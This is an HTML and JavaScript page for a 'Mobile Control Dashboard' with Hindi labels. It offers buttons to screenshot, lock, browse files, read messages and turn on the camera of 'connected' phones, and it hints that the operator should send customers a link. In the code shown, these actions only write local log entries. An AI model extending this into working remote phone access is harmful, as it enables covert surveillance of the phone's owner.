<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Control Dashboard</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .dashboard {
            max-width: 1200px;
            margin: 0 auto;
        }
        .header {
            background: white;
            padding: 30px;
            border-radius: 15px;
            margin-bottom: 30px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .header h1 {
            color: #667eea;
            margin-bottom: 15px;
            font-size: 28px;
        }
        .refresh-btn {
            background: #667eea;
            color: white;
            border: none;
            padding: 12px 20px;
            border-radius: 8px;
            cursor: pointer;
            font-weight: bold;
            margin-right: 10px;
            transition: 0.3s;
        }
        .refresh-btn:hover {
            background: #764ba2;
        }
        .devices-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
            gap: 20px;
        }
        .device-card {
            background: white;
            border-radius: 15px;
            padding: 25px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
            transition: transform 0.3s;
        }
        .device-card:hover {
            transform: translateY(-5px);
        }
        .device-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
            border-bottom: 2px solid #667eea;
            padding-bottom: 15px;
        }
        .device-header h2 {
            color: #667eea;
            font-size: 20px;
        }
        .status {
            display: inline-block;
            padding: 5px 15px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: bold;
            background: #d4edda;
            color: #155724;
        }
        .device-info {
            margin-bottom: 20px;
            font-size: 14px;
        }
        .device-info p {
            color: #666;
            margin-bottom: 8px;
            word-break: break-all;
        }
        .device-info strong {
            color: #333;
        }
        .controls {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 10px;
        }
        .control-btn {
            padding: 12px;
            background: #667eea;
            color: white;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-weight: bold;
            transition: all 0.3s;
            font-size: 12px;
        }
        .control-btn:hover {
            background: #764ba2;
            transform: scale(1.05);
        }
        .control-btn:active {
            transform: scale(0.95);
        }
        .control-btn.danger {
            background: #dc3545;
        }
        .control-btn.danger:hover {
            background: #c82333;
        }
        .no-devices {
            background: white;
            padding: 60px 30px;
            border-radius: 15px;
            text-align: center;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .no-devices h2 {
            color: #667eea;
            margin-bottom: 15px;
            font-size: 24px;
        }
        .no-devices p {
            color: #666;
            font-size: 16px;
            margin-bottom: 20px;
        }
        .activity-log {
            background: white;
            border-radius: 15px;
            padding: 25px;
            margin-top: 30px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .activity-log h3 {
            color: #667eea;
            margin-bottom: 20px;
            font-size: 20px;
        }
        .log-entry {
            padding: 12px;
            border-bottom: 1px solid #eee;
            display: flex;
            justify-content: space-between;
            font-size: 14px;
        }
        .log-entry:last-child {
            border-bottom: none;
        }
        .log-entry .time {
            color: #999;
            font-weight: bold;
        }
        .log-entry .action {
            color: #667eea;
            font-weight: bold;
            flex: 1;
            margin: 0 15px;
        }
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.5);
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }
        .modal.active {
            display: flex;
        }
        .modal-content {
            background: white;
            padding: 30px;
            border-radius: 15px;
            text-align: center;
            max-width: 400px;
            width: 90%;
        }
        .modal-content h2 {
            color: #667eea;
            margin-bottom: 15px;
        }
        .modal-content p {
            color: #666;
            margin-bottom: 20px;
            font-size: 14px;
        }
        .modal-buttons {
            display: flex;
            gap: 10px;
        }
        .modal-buttons button {
            flex: 1;
            padding: 12px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-weight: bold;
            transition: 0.3s;
        }
        .confirm-btn {
            background: #667eea;
            color: white;
        }
        .confirm-btn:hover {
            background: #764ba2;
        }
        .cancel-btn {
            background: #ccc;
            color: #333;
        }
        .cancel-btn:hover {
            background: #bbb;
        }
    </style>
</head>
<body>
    <div class="dashboard">
        <div class="header">
            <h1>🎮 Mobile Control Dashboard</h1>
            <button class="refresh-btn" onclick="refreshDevices()">🔄 Refresh Now</button>
            <span id="refreshStatus" style="color: #667eea; font-weight: bold;"></span>
        </div>

        <div id="devicesContainer"></div>

        <div class="activity-log">
            <h3>📊 गतिविधि लॉग</h3>
            <div id="activityLog"></div>
        </div>
    </div>

    <!-- Control Modal -->
    <div id="controlModal" class="modal">
        <div class="modal-content">
            <h2 id="modalTitle">📱 Device Control</h2>
            <p id="modalMessage"></p>
            <div class="modal-buttons">
                <button class="confirm-btn" onclick="confirmControl()">✅ हाँ</button>
                <button class="cancel-btn" onclick="closeModal()">❌ रद्द करो</button>
            </div>
        </div>
    </div>

    <script>
        let devices = [];
        let activityLogs = [];
        let currentControlAction = null;

        // Load devices from localStorage
        function loadDevices() {
            devices = JSON.parse(localStorage.getItem('connectedDevices')) || [];
            renderDevices();
        }

        function renderDevices() {
            const container = document.getElementById('devicesContainer');
            
            if (devices.length === 0) {
                container.innerHTML = `
                    <div class="no-devices">
                        <h2>📱 कोई Device जुड़ा नहीं है</h2>
                        <p>जब कोई customer link को click करेगा और permission देगा, तो यहाँ दिखेगा।</p>
                        <br>
                        <p style="font-size: 14px; color: #999;">💡 Hint: Customer को यह link भेजो:</p>
                        <p style="font-size: 12px; color: #667eea; font-family: monospace; background: #f5f5f5; padding: 10px; border-radius: 5px;">https://niharika99057-netizen.github.io/mobile-remote-control/</p>
                        <button class="control-btn" onclick="refreshDevices()" style="max-width: 200px; margin: 20px auto 0; width: 100%;">🔄 Refresh करो</button>
                    </div>
                `;
                return;
            }

            container.innerHTML = `
                <div class="devices-grid">
                    ${devices.map((device, index) => `
                        <div class="device-card">
                            <div class="device-header">
                                <h2>Device ${index + 1}</h2>
                                <span class="status">🟢 Online</span>
                            </div>
                            <div class="device-info">
                                <p><strong>📱 Device ID:</strong> ${device.id}</p>
                                <p><strong>🔑 Access Code:</strong> ${device.accessCode}</p>
                                <p><strong>⏰ Connected:</strong> ${new Date(device.timestamp).toLocaleTimeString()}</p>
                                <p><strong>📍 Status:</strong> ${device.lastActivity}</p>
                            </div>
                            <div class="controls">
                                <button class="control-btn" onclick="showControlModal(${index}, 'स्क्रीनशॉट ले सकते हो?', 'screenshot')">📸 Screenshot</button>
                                <button class="control-btn" onclick="showControlModal(${index}, 'फोन लॉक करने हैं?', 'lock')">🔒 Lock</button>
                                <button class="control-btn" onclick="showControlModal(${index}, 'Files देख सकते हो?', 'files')">📁 Files</button>
                                <button class="control-btn" onclick="showControlModal(${index}, 'Messages देख सकते हो?', 'messages')">💬 Messages</button>
                                <button class="control-btn" onclick="showControlModal(${index}, 'कैमरा ऑन करना है?', 'camera')">📷 Camera</button>
                                <button class="control-btn danger" onclick="removeDevice(${index})">❌ Disconnect</button>
                            </div>
                        </div>
                    `).join('')}
                </div>
            `;
        }

        function refreshDevices() {
            loadDevices();
            loadActivityLogs();
            document.getElementById('refreshStatus').textContent = '✅ Refreshed!';
            setTimeout(() => {
                document.getElementById('refreshStatus').textContent = '';
            }, 2000);
        }

        function removeDevice(index) {
            if (confirm('क्या आप इस device को disconnect करना चाहते हैं?')) {
                devices.splice(index, 1);
                localStorage.setItem('connectedDevices', JSON.stringify(devices));
                loadDevices();
                addActivityLog('❌ Device Disconnected');
                alert('✅ Device disconnect हो गया!');
            }
        }

        function loadActivityLogs() {
            activityLogs = JSON.parse(localStorage.getItem('activityLogs')) || [];
            if (activityLogs.length === 0) {
                activityLogs = [
                    { time: new Date().toLocaleTimeString(), action: '🔄 Dashboard Started' }
                ];
            }
            renderActivityLog();
        }

        function renderActivityLog() {
            const container = document.getElementById('activityLog');
            if (activityLogs.length === 0) {
                container.innerHTML = '<p style="color: #999;">कोई गतिविधि नहीं</p>';
                return;
            }
            container.innerHTML = activityLogs.map(log => `
                <div class="log-entry">
                    <span class="time">${log.time}</span>
                    <span class="action">${log.action}</span>
                </div>
            `).join('');
        }

        function addActivityLog(action) {
            const now = new Date();
            activityLogs.unshift({
                time: now.toLocaleTimeString(),
                action: action
            });
            localStorage.setItem('activityLogs', JSON.stringify(activityLogs));
            renderActivityLog();
        }

        function showControlModal(index, message, action) {
            currentControlAction = { index, action };
            document.getElementById('modalMessage').textContent = message;
            document.getElementById('controlModal').classList.add('active');
        }

        function confirmControl() {
            if (currentControlAction) {
                const actions = {
                    'screenshot': '📸 Screenshot लिया गया',
                    'lock': '🔒 Phone lock किया गया',
                    'files': '📁 Files access किया गया',
                    'messages': '💬 Messages देखे गए',
                    'camera': '📷 Camera activate किया गया'
                };

                addActivityLog(actions[currentControlAction.action]);
                closeModal();
                alert('✅ ' + actions[currentControlAction.action]);
            }
        }

        function closeModal() {
            document.getElementById('controlModal').classList.remove('active');
            currentControlAction = null;
        }

        // Initialize
        window.addEventListener('load', () => {
            loadDevices();
            loadActivityLogs();
        });

        // Auto-refresh every 3 seconds
        setInterval(() => {
            loadDevices();
        }, 3000);
    </script>
</body>
</html>
